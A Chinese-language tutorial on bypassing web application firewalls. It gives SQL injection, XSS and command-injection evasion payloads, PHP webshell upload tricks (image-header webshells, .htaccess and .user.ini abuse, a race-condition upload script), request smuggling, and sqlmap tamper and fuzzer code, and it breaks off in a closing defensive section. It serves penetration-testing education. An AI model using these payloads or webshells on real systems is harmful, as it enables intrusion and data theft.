# WAF绕过技术指南

> 本文档系统化讲解Web应用防火墙（WAF）的检测原理与绕过技术，涵盖SQL注入/XSS/文件上传/命令注入等场景的绕过方法、通用绕过技巧、自动化绕过工具，以及WAF防护最佳实践。理论与实战结合，所有内容仅用于授权安全测试。

---

## 目录

1. [WAF概述](#1-waf概述)
2. [SQL注入WAF绕过](#2-sql注入waf绕过)
3. [XSS绕过技术](#3-xss绕过技术)
4. [文件上传WAF绕过](#4-文件上传waf绕过)
5. [命令注入绕过](#5-命令注入绕过)
6. [通用WAF绕过技巧](#6-通用waf绕过技巧)
7. [自动化WAF绕过工具](#7-自动化waf绕过工具)
8. [WAF配置与防护最佳实践](#8-waf配置与防护最佳实践)

---

## 1. WAF概述

### 1.1 什么是WAF

Web应用防火墙（Web Application Firewall，WAF）是专门针对HTTP/HTTPS流量进行安全防护的设备或软件。与传统网络防火墙不同，WAF工作在应用层（OSI第7层），能够理解HTTP协议语义，对Web攻击进行深度检测和拦截。

```
WAF在网络架构中的位置:
┌──────┐    ┌──────┐    ┌─────┐    ┌──────────┐    ┌──────────┐
│ 用户 │───→│ CDN  │───→│ WAF │───→│ 负载均衡 │───→│ Web服务器 │
└──────┘    └──────┘    └─────┘    └──────────┘    └──────────┘
                            │
                     检测/拦截/告警
```

### 1.2 WAF类型

| 类型 | 部署方式 | 优势 | 劣势 | 典型产品 |
|------|----------|------|------|----------|
| 网络型WAF | 硬件设备串联部署 | 性能强、透明部署 | 成本高、维护重 | Imperva/F5 ASM |
| 主机型WAF | 软件安装在服务器 | 深度防护、定制化 | 占用服务器资源 | ModSecurity/Naxsi |
| 云WAF | DNS/反代方式接入 | 部署快、弹性扩容 | 依赖网络质量 | Cloudflare/AWS WAF/阿里云WAF |
| RASP | 运行时应用自保护 | 精准防护、少误报 | 性能开销、语言绑定 | OpenRASP/百度RASP |

### 1.3 WAF检测原理

```
WAF检测引擎层次:
├── 规则匹配层（最基础）
│   ├── 正则表达式匹配已知攻击特征
│   ├── 黑名单关键词检测
│   └── 特征库（OWASP CRS、自维护规则）
│
├── 语义分析层
│   ├── HTTP协议解析（方法/头/体/参数）
│   ├── SQL语法解析（SQL Parser）
│   ├── JSON/XML结构解析
│   └── 多参数关联分析
│
├── 行为分析层
│   ├── 请求频率/模式分析
│   ├── 用户行为基线建模
│   ├── 机器人/爬虫识别
│   └── 慢速攻击检测
│
├── 机器学习层
│   ├── 异常检测模型
│   ├── 分类模型（正常/攻击）
│   └── 深度学习语义理解
│
└── 威胁情报层
    ├── IP信誉库匹配
    ├── 攻击源情报联动
    └── 实时威胁情报更新
```

**WAF处理流程：**

```
请求到达 → 协议解析 → 规则匹配 → 语义分析 → 行为评估
                                                    │
                                    ┌───────────────┤
                                    ↓               ↓
                                 放行            拦截/挑战/告警
```

### 1.4 WAF局限性

| 局限性 | 说明 | 绕过方向 |
|--------|------|----------|
| 规则滞后 | 规则更新慢于攻击手法 | 新型变形绕过 |
| 语义理解不足 | 多数WAF仍以正则为主 | 语义等价变形 |
| 解析差异 | WAF与后端解析逻辑不一致 | 解析差异绕过 |
| 性能限制 | 大量规则影响性能 | 超长请求/分块绕过 |
| 误报压力 | 为减少误报放宽规则 | 边界值绕过 |
| 加密流量 | HTTPS解密消耗大 | 利用解密时机差 |

---

## 2. SQL注入WAF绕过

### 2.1 大小写绕过

最基础的绕过方式，利用SQL关键字大小写不敏感的特性：

```sql
-- 原始Payload
UNION SELECT 1,2,3--

-- 大小写变形
UnIoN SeLeCt 1,2,3--
uNiOn sElEcT 1,2,3--
UNiOn SeLEcT 1,2,3--
```

**原理：** SQL关键字不区分大小写，但部分WAF规则仅匹配特定大小写组合。

**防御：** WAF规则应对SQL关键字做大小写不敏感匹配（`(?i)union`）。

### 2.2 注释绕过

利用SQL注释语法拆分关键字：

```sql
-- 内联注释拆分
UN/**/ION SE/**/LECT 1,2,3--
UNI/**/ON SEL/**/ECT 1,2,3--

-- MySQL特有内联注释
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- 多行注释
UN/*comment*/ION SE/*comment*/LECT 1,2,3--

-- 换行注释
UNION%0aSELECT 1,2,3--
```

**原理：** MySQL的`/**/`注释会被SQL引擎忽略，但部分WAF可能不正确处理注释，导致关键字被拆分后无法匹配。

**MySQL版本号注释：** `/*!50000 ...*/` 表示MySQL 5.00.00以上版本执行其中的SQL。

### 2.3 编码绕过

#### 2.3.1 URL编码

```
原始: UNION SELECT
URL编码: %55NION %53ELECT
双重编码: %2555NION %2553ELECT
```

**双重编码绕过原理：** 某些应用在解码一次URL编码后传给WAF，WAF不解码或解码一次，而后端再次解码，导致WAF看到的不是关键字。

#### 2.3.2 十六进制编码

```sql
-- 字符串十六进制
SELECT * FROM users WHERE name=0x61646d696e  -- 'admin'

-- CHAR()函数
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)  -- 'admin'
```

#### 2.3.3 Unicode编码

```sql
-- Unicode编码
UNION SELECT → %u0055NION %u0053ELECT

-- 利用IIS Unicode解码特性
```

### 2.4 等价函数绕过

利用功能等价的函数替换被WAF拦截的函数：

```
等价替换表:
┌────────────────┬───────────────────────────────┐
│ 被拦截函数     │ 等价替代                       │
├────────────────┼───────────────────────────────┤
│ UNION SELECT   │ UNION ALL SELECT              │
│ UNION SELECT   │ UNION DISTINCT SELECT         │
│ SUBSTRING()    │ MID()/SUBSTR()/LEFT()/RIGHT() │
│ ASCII()        │ ORD()/HEX()/CONV()            │
│ CONCAT()      │ CONCAT_WS()/GROUP_CONCAT()    │
│ SLEEP()       │ BENCHMARK()/GET_LOCK()        │
│ @@version     │ version()                     │
│ USER()        │ CURRENT_USER()/SESSION_USER() │
│ DATABASE()    │ SCHEMA()                      │
│ IF()          │ CASE WHEN ... THEN ... END    │
│ LIMIT 0,1     │ LIMIT 1 OFFSET 0              │
└────────────────┴───────────────────────────────┘
```

**示例：**

```sql
-- 原始（被拦截）
UNION SELECT 1,user(),3--

-- 等价替换
UNION SELECT 1,current_user(),3--
UNION SELECT 1,session_user(),3--
UNION SELECT 1,concat(user(),' '),3--
```

### 2.5 内联注释绕过

MySQL特有的内联注释`/*!...*/`可以在注释中嵌入SQL语句：

```sql
-- 内联注释执行SQL
/*!50000UNION*//*!50000SELECT*/ 1,2,3--

-- 结合版本号
/*!50000UniON*//*!50000SeLeCt*/ 1,user(),3--

-- 利用版本号差异
/*!00000UNION SELECT*/ 1,2,3--  -- 0版本号使所有MySQL执行
```

### 2.6 空格绕过

WAF可能依赖空格来分割SQL关键字，可用替代字符绕过：

```
空格替代字符:
├── Tab         %09  (制表符)
├── 换行        %0a  (LF)
├── 回车        %0d  (CR)
├── 换行+回车   %0d%0a (CRLF)
├── 垂直制表符  %0b
│   换页符      %0c
├── 注释        /**/
├── 括号        ()
└── 加号        + (在URL中)
```

```sql
-- 空格替代示例
UNION%0aSELECT 1,2,3--
UNION%09SELECT%091,2,3--
UNION/**/SELECT/**/1,2,3--
UNION(SELECT 1,2,3)--
```

### 2.7 HTTP参数污染（HPP）

利用前后端对同名参数处理方式的差异：

```
-- HPP绕过
GET /search.php?id=1&id=UNION+SELECT+1,2,3 HTTP/1.1

-- 不同后端处理:
PHP:        取最后一个 → id=UNION SELECT 1,2,3
ASP.NET:    用逗号拼接 → id=1,UNION SELECT 1,2,3
JSP:        取第一个 → id=1
Python:     取第一个 → id=1
```

**绕过原理：** WAF可能只检查其中一个参数值或拼接后检查，但后端实际使用的值与WAF检查的值不同。

**分割Payload：**

```
GET /search.php?id=1/**/&id=**/UNION/**/&id=**/SELECT/**/&id=**/1,2,3 HTTP/1.1
-- WAF分别检查各参数值，看似无害
-- 后端拼接后: 1/**/**/UNION/**/**/SELECT/**/**/1,2,3
```

### 2.8 分块传输绕过

利用HTTP/1.1的Transfer-Encoding: chunked分块传输请求体：

```
POST /search.php HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5
id=1%
6
20UNI
6
ON SEL
5
ECT 
5
1,2,3
0

```

**原理：** 部分WAF不正确处理分块传输，只在完整请求体中匹配，而分块后的请求被后端重组执行。WAF可能看到的是碎片化的内容，无法匹配完整特征。

### 2.9 综合绕过示例

```sql
-- 目标: 构造UNION SELECT绕过WAF
-- 原始Payload: UNION SELECT 1,user(),3

-- 综合变形1: 编码+注释+等价函数
%55NION/**/SeLeCt/**/1,current_user%28%29,3--

-- 综合变形2: 内联注释+空格替代+等价函数
/*!50000UNiOn*//*!50000SeLeCt*/%0a1,session_user%28%29,3%23

-- 综合变形3: HPP+编码
id=1&id=UNI&id=ON+SELE&id=CT+1,2,3

-- 综合变形4: 双重编码+等价
%2555NION+%2553ELECT+1,SCHEMA%28%29,3
```

---

## 3. XSS绕过技术

### 3.1 标签变形

通过HTML标签变形绕过WAF的XSS规则匹配：

```html
<!-- 原始Payload -->
<script>alert(1)</script>

<!-- 大小写变形 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 嵌套标签 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 空格/换行插入 -->
<script/x>alert(1)</script>
<script%0a>alert(1)</script%0a>

<!-- 编码实体 -->
<script>&#97;lert(1)</script>

<!-- 标签属性插入 -->
<script type="text/javascript">alert(1)</script>
<script data="x">alert(1)</script>
```

### 3.2 事件绕过

利用HTML事件处理器替代`<script>`标签：

```html
<!-- 常见事件处理器 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 冷门事件 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video oncanplay=alert(1) src=x>
<svg onanimationstart=alert(1)>

<!-- 事件名变形 -->
<img src=x ONERROR=alert(1)>
<img src=x OnErRoR=alert(1)>

<!-- 事件处理器编码 -->
<img src=x onerror=&#97;lert(1)>
```

### 3.3 编码绕过

#### 3.3.1 HTML实体编码

```html
<!-- 十进制HTML实体 -->
<img src=x onerror=alert(&#49;)>

<!-- 十六进制HTML实体 -->
<img src=x onerror=alert(&#x31;)>

<!-- 无分号实体（部分浏览器支持） -->
<img src=x onerror=alert(&#49)>

<!-- 实体编码标签名 -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

#### 3.3.2 JavaScript编码

```html
<!-- Unicode编码 -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- 八进制 -->
<img src=x onerror=\141\154\145\162\164(1)>

<!-- 十六进制 -->
<img src=x onerror=\x61\x6c\x65\x72\x74(1)>

<!-- 混合编码 -->
<img src=x onerror=\u0061lert(1)>
```

#### 3.3.3 Data URI

```html
<!-- Data URI执行JavaScript -->
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

#### 3.3.4 Base64编码

```html
<!-- Base64编码Payload -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<!-- atob('YWxlcnQoMSk=') = alert(1) -->

<!-- 结合Data URI -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 3.4 Content-Type绕过

```
Content-Type绕过场景:
├── JSON API中的XSS
│   ├── 修改Content-Type为text/html
│   └── 利用API返回错误页面渲染HTML
│
├── XML中的XSS
│   ├── 利用XHTML渲染
│   └── XML实体注入配合XSS
│
├── 多部分表单中的XSS
│   └── 在文件名/Content-Disposition中注入
│
└── 响应头注入
    ├── HTTP响应拆分 → 注入Content-Type: text/html
    └── 利用CRLF注入修改响应头
```

### 3.5 上下文相关绕过

根据XSS注入点的上下文，采用不同的绕过策略：

```html
<!-- 上下文1: HTML标签属性中 -->
<input value="INPUT_HERE">
→ " onfocus=alert(1) autofocus="
→ " onmouseover=alert(1) //"

<!-- 上下文2: JavaScript字符串中 -->
<script>var x = 'INPUT_HERE';</script>
→ ';alert(1);//
→ '</script><script>alert(1)</script>

<!-- 上下文3: JavaScript代码块中 -->
<script>INPUT_HERE</script>
→ alert(1)//

<!-- 上下文4: URL参数中 -->
<a href="INPUT_HERE">link</a>
→ javascript:alert(1)
→ data:text/html,<script>alert(1)</script>
```

### 3.6 CSP绕过

当目标部署了内容安全策略（CSP）时，可尝试以下绕过方式：

```
CSP绕过方法:
├── 利用CSP白名单中的可信域
│   ├── 如果白名单含cdn → 利用CDN上的JS库
│   └── 如果白名单含google → 利用Google Analytics的回调
│
├── 利用JSONP端点
│   ├── 找到白名单域的JSONP接口
│   └── 通过callback参数执行代码
│
├── 利用base标签
│   ├── 如果CSP未限制base-uri
│   └── 修改JS加载基路径
│
├── 利用unsafe-inline/unsafe-eval
│   ├── unsafe-inline → 直接执行内联脚本
│   └── unsafe-eval → 使用eval/Function执行
│
└── 利用DNS预解析
    └── 通过DNS prefetch泄露数据
```

```html
<!-- JSONP绕过CSP示例 -->
<!-- 如果CSP白名单含trusted.com -->
<script src="https://trusted.com/api/jsonp?callback=alert(1)"></script>
<!-- trusted.com返回: alert(1);{"data":"..."} -->
```

---

## 4. 文件上传WAF绕过

### 4.1 Content-Type修改

```
文件上传绕过 - Content-Type:
┌─────────────────────────────────────────────┐
│ 原始请求:                                    │
│ Content-Type: application/x-php              │
│ → 被WAF拦截                                  │
│                                              │
│ 修改后:                                      │
│ Content-Type: image/jpeg                     │
│ → 绕过WAF的Content-Type检测                  │
│                                              │
│ 后端如果仅检查Content-Type → 上传成功         │
│ 后端如果检查文件内容 → 需配合文件头伪造       │
└─────────────────────────────────────────────┘
```

### 4.2 文件头伪造

在恶意文件内容前添加合法文件头，绕过基于文件头（Magic Number）的检测：

```php
// GIF文件头 + PHP代码
GIF89a <?php @eval($_POST['cmd']); ?>

// JPEG文件头
\xFF\xD8\xFF\xE0<?php @eval($_POST['cmd']); ?>

// PNG文件头
\x89PNG\r\n\x1a\n<?php @eval($_POST['cmd']); ?>
```

**绕过原理：** 后端使用`finfo`或`getimagesize()`检测文件类型时，主要依据文件头判断。添加合法文件头后，这些函数会将其识别为图片文件，但Web服务器仍会将其作为PHP执行（如果后缀为.php）。

### 4.3 后缀变形

利用Web服务器和后端对不同文件后缀的处理差异：

```
后缀变形绕过:
├── Apache解析漏洞
│   ├── test.php.jpg → Apache可能将.php.jpg作为PHP执行
│   ├── test.php.xxx.jpg → 多后缀解析
│   └── test.php%00.jpg → 空字节截断
│
├── PHP后缀变形
│   ├── .php3 / .php4 / .php5 / .php7
│   ├── .phtml / .pht / .phps
│   └── .phar
│
├── ASP/ASPX变形
│   ├── .asp / .aspx / .asa / .asax
│   ├── .cer / .cdx
│   └── .ashx / .asmx
│
├── JSP变形
│   ├── .jsp / .jspx
│   ├── .jspf / .jspa
│   └── .jhtml
│
└── 大小写变形
    ├── .PHP / .Php / .pHp
    └── 利用大小写不敏感的系统
```

### 4.4 .htaccess绕过

利用Apache的`.htaccess`配置文件改变文件执行行为：

```apache
# .htaccess方式1: 将特定后缀作为PHP执行
AddType application/x-httpd-php .jpg

# .htaccess方式2: 为特定文件设置PHP处理器
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>

# .htaccess方式3: auto_prepend_file
php_value auto_prepend_file "/path/to/hidden_shell.php"
```

**利用流程：**
1. 先上传`.htaccess`文件（如果允许上传）
2. 再上传`shell.jpg`（内容为PHP代码）
3. Apache根据`.htaccess`将`.jpg`作为PHP执行

### 4.5 .user.ini绕过（PHP）

```ini
; .user.ini - PHP用户配置文件
; 在Web目录中创建此文件
; PHP在执行该目录中的PHP文件前自动加载

; 将隐藏的Shell文件在每个PHP请求前自动包含
auto_prepend_file = .hidden_shell.php

; 或直接包含图片马
auto_prepend_file = uploads/avatar.jpg
```

**利用流程：**
1. 上传`.user.ini`到Web目录
2. 上传包含PHP代码的文件（如`avatar.jpg`）
3. 访问该目录中任意PHP文件 → 自动包含Shell

### 4.6 multipart/form-data绕过

利用多部分表单的数据解析差异：

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundary--

-- 绕过变形:

变形1 - filename编码:
filename="shell.ph%70"  → 后端URL解码 → shell.php

变形2 - 双filename:
filename="shell.jpg"; filename="shell.php"
→ WAF取第一个, 后端取最后一个

变形3 - 空字节截断:
filename="shell.php%00.jpg"
→ WAF看到.jpg, 后端截断为.php

变形4 - Content-Disposition变形:
Content-Disposition: form-data; name=file; filename=shell.php
→ 去掉引号

变形5 - 多boundary:
Content-Type: multipart/form-data; boundary=A; boundary=B
→ 解析差异
```

### 4.7 竞争条件绕过

利用文件上传到删除之间的时间窗口执行Shell：

```python
# 竞争条件利用脚本（概念示意）
import requests
import threading

def upload_and_access():
    while True:
        # 上传Shell
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        r = requests.post('http://target/upload.php', files=files)
        # 立即访问（在文件被删除前执行）
        r = requests.get('http://target/uploads/shell.php?cmd=id')
        if 'uid=' in r.text:
            print('Success:', r.text)
            break

# 多线程竞争
threads = [threading.Thread(target=upload_and_access) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

**原理：** 某些上传逻辑是先保存文件再检查并删除，在保存到删除之间存在时间窗口，高并发请求可以在文件被删除前访问并执行。

---

## 5. 命令注入绕过

### 5.1 通配符绕过

利用Shell通配符（glob）绕过对命令关键字的检测：

```bash
# 原始命令
cat /etc/passwd

# 通配符绕过
cat /etc/pa??wd
cat /etc/pa*wd
cat /etc/pass*

# 利用问号匹配任意单字符
/bin/cat /etc/pa??wd

# 利用方括号字符集
cat /etc/p[a]sswd
cat /etc/p[a-z]sswd
```

**原理：** Shell通配符在执行前由Shell展开为实际文件名，WAF检测的是通配符模式而非展开后的命令，从而绕过关键字检测。

### 5.2 变量替换

利用Shell变量特性构造命令：

```bash
# 变量拼接
a=ca;b=t;$a$b /etc/passwd

# 变量替换
${IFS}替代空格: cat${IFS}/etc/passwd

# 变量截取
a=cat;echo ${a:0:2}  → ca

# 反引号执行
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`  → cat /etc/passwd

# $()执行
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

### 5.3 编码绕过

```bash
# Base64编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
# Y2F0IC9ldGMvcGFzc3dk = cat /etc/passwd

# Hex编码
echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh

# Octal编码
echo -e '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144' | sh

# 利用printf
printf '\x63\x61\x74' | sh  → cat
```

### 5.4 空格绕过

```bash
# IFS变量替代空格
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat$'\x20'/etc/passwd

# 花括号扩展
{cat,/etc/passwd}  → cat /etc/passwd

# 重定向符
cat</etc/passwd
cat<>/etc/passwd

# Tab键替代
cat%09/etc/passwd  (\t在URL中为%09)

# $IFS组合
cat${IFS}${IFS}/etc/passwd
```

### 5.5 引号绕过

```bash
# 单引号拼接
c'a't /etc/passwd
c"a"t /etc/passwd

# 反斜杠拼接
c\at /etc/passwd
\c\a\t /etc/passwd

# 混合使用
c''at /etc/passwd
c'a''t /etc/passwd

# 特殊字符组合
ca\t$()\ /etc/passwd
```

### 5.6 综合命令注入绕过示例

```bash
# 目标: 执行 cat /etc/passwd
# 假设WAF拦截: cat, /etc/passwd, 空格

# 绕过1: 变量+通配符+IFS
a=ca;b=t;$a$b$IFS/etc/pa??wd

# 绕过2: 编码+引号
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# 绕过3: 反斜杠+花括号
\c\a\t</etc/passwd
{c,a,t}/etc/p[a]sswd

# 绕过4: 变量+编码
p=/etc/passwd;cat$IFS$p
```

---

## 6. 通用WAF绕过技巧

### 6.1 HTTP参数污染（HPP）

HPP适用于多种攻击场景，核心是利用前后端对同名参数的不同处理方式：

```
HPP在各场景的应用:
├── SQL注入
│   → 分割SQL关键字到不同参数
│   → 利用后端拼接绕过WAF
│
├── XSS
│   → 分割XSS Payload
│   → 利用后端拼接渲染
│
├── 命令注入
│   → 分割命令到不同参数
│
└── 路径穿越
    → 分割../序列
```

**后端参数处理差异表：**

| 后端语言 | 同名参数处理 | 示例(id=1&id=2) |
|----------|-------------|-----------------|
| PHP | 取最后一个 | id=2 |
| ASP.NET | 逗号拼接 | id=1,2 |
| JSP/Servlet | 取第一个 | id=1 |
| Python Flask | 取第一个 | id=1 |
| Node.js Express | 数组 | id=["1","2"] |
| Python Django | 取最后一个 | id=2 |

### 6.2 分块传输编码（Chunked Transfer）

利用HTTP/1.1的分块传输机制绕过WAF的内容检测：

```
分块传输绕过原理:
1. 请求体被分为多个chunk
2. WAF可能:
   a. 不支持分块解析 → 看不到完整Payload
   b. 逐chunk检查 → 每个chunk都是碎片
   c. 重组后检查 → 可被超时绕过
3. 后端完整重组执行

关键技术:
- 利用chunk大小字段混淆
- 在chunk间插入干扰数据
- 超长chunk耗尽WAF缓冲
```

**分块变形：**

```
POST /target.php HTTP/1.1
Transfer-Encoding: chunked

4
TE
4
st1
0

→ 重组后: TEst1

变形1: chunk大小带空格
0x 4\r\n  → 某些WAF解析失败

变形2: 多余数据
4\r\n
Test\r\n
;comment\r\n  → 注释行干扰WAF
0\r\n

变形3: 超长chunk
10000000\r\n  → 声称很大但发送少量数据
```

### 6.3 超长URL/请求体

利用WAF对请求体长度限制，将恶意Payload淹没在大量数据中：

```
超长请求绕过:
1. 在参数中填充大量垃圾数据
2. WAF因性能限制不检查超长请求体
3. 后端截取有效部分执行Payload

示例:
POST /search.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1048576

id=1 UNION SELECT 1,user(),3&junk=AAAA...(100万字符)...AAAA
```

**防御：** WAF应配置合理的请求体大小限制和深度检测。

### 6.4 请求方法变换

利用非标准HTTP方法绕过WAF的规则匹配：

```
请求方法变换:
├── GET → POST/PUT/PATCH
├── GET → DEBUG (IIS特有)
├── GET → PROPFIND (WebDAV)
├── GET → 自定义方法 (如JENKINS)
└── 利用TRACE/XST

原理:
- WAF可能仅对GET/POST做深度检测
- 其他方法的检测规则可能不完善
- 后端通过$_REQUEST获取参数时忽略方法
```

### 6.5 协议层绕过

利用HTTP协议本身的特性绕过WAF：

```
协议层绕过:
├── HTTP/0.9
│   └── 不发送HTTP头，仅发送请求行
│
├── HTTP/2
│   ├── 二进制帧可能不被WAF正确解析
│   └── HPACK头压缩可能绕过检测
│
├── 请求走私（HTTP Request Smuggling）
│   ├── 利用前后端CL/TE差异
│   ├── CL.TE: 前端用Content-Length，后端用Transfer-Encoding
│   └── TE.CL: 前端用Transfer-Encoding，后端用Content-Length
│
├── HTTP响应拆分
│   ├── 利用CRLF注入修改响应
│   └── 注入Set-Cookie/Location
│
└── WebSocket
    ├── WAF可能不检查WebSocket流量
    └── 通过WebSocket传递攻击Payload
```

**请求走私示例（CL.TE）：**

```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端（WAF）用Content-Length=13读取完整请求，后端用Transfer-Encoding读到`0\r\n\r\n`结束，剩余的`SMUGGLED`被当作下一个请求的开头。

### 6.6 超时绕过

```
超时绕过策略:
├── 慢速HTTP攻击
│   ├── Slowloris: 缓慢发送HTTP头
│   └── 超长等待消耗WAF资源
│
├── 时间盲注配合
│   ├── WAF有超时限制（如5秒）
│   ├── 时间盲注sleep(10)超过WAF超时
│   └── WAF放弃检测，放行请求
│
└── 大数据慢传
    └── 以极低速率传输大量数据
```

---

## 7. 自动化WAF绕过工具

### 7.1 sqlmap --tamper

sqlmap是最流行的SQL注入自动化工具，其`--tamper`参数可以加载绕过脚本：

```bash
# 基本用法
sqlmap -u "http://target/page.php?id=1" --tamper="tamper_script.py"

# 多个tamper组合
sqlmap -u "http://target/page.php?id=1" --tamper="space2comment,between,randomcase"

# 常用tamper脚本
sqlmap -u "http://target/page.php?id=1" --tamper="space2comment.py"
# 将空格替换为/**/注释

sqlmap -u "http://target/page.php?id=1" --tamper="between.py"
# 将>替换为BETWEEN

sqlmap -u "http://target/page.php?id=1" --tamper="randomcase.py"
# 关键字随机大小写

sqlmap -u "http://target/page.php?id=1" --tamper="charunicodeencode.py"
# Unicode编码

sqlmap -u "http://target/page.php?id=1" --tamper="charencode.py"
# URL全编码
```

**常用tamper脚本汇总：**

| tamper脚本 | 功能 | 适用场景 |
|-----------|------|----------|
| space2comment | 空格→/**/ | 通用SQL注入 |
| space2plus | 空格→+ | 通用SQL注入 |
| between | >→BETWEEN | 比较操作绕过 |
| randomcase | 随机大小写 | 关键字绕过 |
| charencode | URL编码 | 编码绕过 |
| charunicodeencode | Unicode编码 | 编码绕过 |
| modsecurityversioned | MySQL内联注释 | MySQL WAF |
| halfversionedmorekeywords | 关键字加注释 | MySQL WAF |
| append0ttf | 末尾添加注释 | 通用 |
| base64encode | Base64编码 | 编码绕过 |

**自定义tamper脚本：**

```python
# custom_tamper.py - 自定义sqlmap tamper脚本
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    # 自定义绕过逻辑
    # 例如: 将UNION替换为内联注释形式
    payload = payload.replace("UNION", "/*!50000UNION*/")
    payload = payload.replace("SELECT", "/*!50000SELECT*/")
    payload = payload.replace(" ", "/**/")
    return payload
```

### 7.2 wafw00f

wafw00f是WAF识别工具，用于探测目标是否部署了WAF及WAF类型：

```bash
# 基本探测
wafw00f http://target.com

# 详细模式
wafw00f -v http://target.com

# 通过代理
wafw00f -p http://proxy:8080 http://target.com

# 输出示例:
# [+] This site is behind a Cloudflare WAF
# [+] Canary URL: http://target.com
# [+] Number of requests: 13
```

**wafw00f支持的WAF类型：**

```
wafw00f可识别的WAF:
├── Cloudflare
├── AWS WAF
├── Akamai
├── F5 ASM
├── ModSecurity
├── Imperva
├── Edgecast
├── Sucuri
├── 阿里云WAF
├── 腾讯云WAF
└── ...（100+种WAF）
```

### 7.3 bypass-firewall-by-fuzzing

bypass-firewall-by-fuzzing（BSQLi/bfpf）是通过模糊测试自动发现WAF绕过Payload的工具：

```bash
# 基本用法
python bf-fuzz.py -u "http://target/page.php?id=1" -t "attack_signature"

# 参数说明
# -u: 目标URL
# -t: 测试攻击特征（如SQL注入特征）
# -o: 输出有效绕过Payload

# 工作流程:
# 1. 发送正常请求作为基线
# 2. 发送攻击Payload确认WAF拦截
# 3. 对Payload进行变异模糊测试
# 4. 检测响应是否绕过了WAF
# 5. 输出有效的绕过Payload
```

### 7.4 其他工具

| 工具 | 功能 | 说明 |
|------|------|------|
| SQLi-helfer | SQL注入绕过Payload生成 | 针对特定WAF |
| HexMe | 自动化编码绕过 | 多种编码方式 |
| PWAF (Python WAF Fuzzer) | WAF模糊测试 | Python实现 |
| whatWAF | WAF识别+绕过建议 | 综合工具 |
| libsqli-filter-bypass | SQLi绕过库 | Payload集合 |
| XSStrike | XSS绕过自动测试 | 多种编码 |
| PwnXSS | XSS Payload生成 | 自动变形 |

### 7.5 自定义绕过Payload测试框架

```python
# WAF绕过测试框架概念示意
import requests
from urllib.parse import quote

class WAFFuzzer:
    def __init__(self, target_url, waf_indicator=None):
        self.target = target_url
        self.waf_indicator = waf_indicator or ['blocked', 'forbidden', '403']
        self.baseline_response = None
    
    def set_baseline(self, param, value):
        """设置正常请求基线"""
        r = requests.get(self.target, params={param: value})
        self.baseline_response = r
        return r
    
    def test_attack(self, param, payload):
        """测试攻击Payload是否被WAF拦截"""
        r = requests.get(self.target, params={param: payload})
        # 检测是否被拦截
        is_blocked = any(
            indicator.lower() in r.text.lower() 
            for indicator in self.waf_indicator
        )
        return not is_blocked and r.status_code == 200
    
    def try_bypass(self, param, payload, bypass_methods):
        """尝试各种绕过方法"""
        results = []
        for method_name, transform_func in bypass_methods.items():
            bypassed_payload = transform_func(payload)
            if self.test_attack(param, bypassed_payload):
                results.append({
                    'method': method_name,
                    'payload': bypassed_payload,
                    'success': True
                })
        return results

# 绕过方法定义
bypass_methods = {
    'url_encode': lambda p: quote(p),
    'double_encode': lambda p: quote(quote(p)),
    'case_variation': lambda p: ''.join(
        c.upper() if i%2 else c.lower() for i,c in enumerate(p)
    ),
    'comment_split': lambda p: p.replace(' ', '/**/'),
    'unicode_encode': lambda p: ''.join(
        f'%u{ord(c):04x}' if not c.isalnum() else c for c in p
    ),
}
```

---

## 8. WAF配置与防护最佳实践

### 8.1 WAF规则配置

**ModSecurity核心规则集（CRS）配置：**

```apache
# ModSecurity配置示例
# 启用ModSecurity
SecRuleEngine On

# 设置默认动作
SecDefaultAction "phase:2,pass,log,tag:'WAS_TEST'"

# 请求体大小限制
SecRequestBodyLimit 134217728  # 128MB
SecRequestBodyNoFilesLimit 1048576  # 1MB

# 请求体访问
SecRequestBodyAccess On

# 响应体访问
SecResponseBodyAccess On
SecResponseBodyLimit 524288  # 512KB

# 日志配置
SecAuditEngine RelevantOnly
SecAuditLogType Serial
SecAuditLog /var/log/modsec_audit.log

# 包含OWASP CRS
IncludeOptional /usr/share/modsecurity-crs/*.rules
```

**关键规则配置原则：**

```
WAF规则配置原则:
├── 防御深度
│   ├── 规则匹配（第一层）
│   ├── 语义分析（第二层）
│   └── 行为分析（第三层）
│
├── 防护范围
│   ├── SQL注入（OWASP CRS规则集）
│   ├── XSS（输出编码+输入过滤）
│   ├── 文件上传（后缀+内容+大小）
│   ├── 命令注入（特殊字符过滤）
│   ├── 路径穿越（../过滤）
│   ├── SSRF（内网IP过滤）
│   └── 反序列化（Content-Type检测）
│
├── 规则质量
